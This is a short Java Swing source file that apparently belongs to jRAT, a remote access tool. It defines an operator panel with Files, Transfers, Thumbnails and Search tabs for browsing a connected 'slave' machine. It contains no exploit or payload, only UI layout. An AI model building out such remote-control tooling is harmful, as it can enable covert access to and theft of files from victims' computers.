package jrat.module.fs.ui;

import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelFileTransfers;

import javax.swing.*;
import java.awt.*;

@SuppressWarnings("serial")
public class FrameRemoteFiles extends ClientPanel {
	
	private JTabbedPane tabbedPane;
	private PanelRemoteFiles remoteFiles;
	private PanelSearchFiles searchPanel;
	private PanelThumbView thumbPanel;

	public FrameRemoteFiles(Slave slave) {
		super(slave, "File Browser", Resources.getIcon("folder-tree"));

		setLayout(new BorderLayout(0, 0));

		remoteFiles = new PanelRemoteFiles(slave, this);
		
		searchPanel = new PanelSearchFiles(slave, this);
		thumbPanel = new PanelThumbView(slave);
		
		tabbedPane = new JTabbedPane();
		tabbedPane.addTab("Files", Resources.getIcon("folder-tree"), remoteFiles);
		tabbedPane.addTab("Transfers", Resources.getIcon("arrow-down"), PanelFileTransfers.instance);
		tabbedPane.addTab("Thumbnails", Resources.getIcon("images-stack"), thumbPanel);
		tabbedPane.addTab("Search", Resources.getIcon("folder-search"), searchPanel);
		
		add(tabbedPane, BorderLayout.CENTER);	
	}

	public PanelRemoteFiles getFilesPanel() {
		return remoteFiles;
	}

	public PanelSearchFiles getSearchPanel() {
		return searchPanel;
	}
	
	public PanelThumbView getThumbPanel() {
		return thumbPanel;
	}
	
	public void setTab(Component tab) {
		tabbedPane.setSelectedComponent(tab);
	}

}
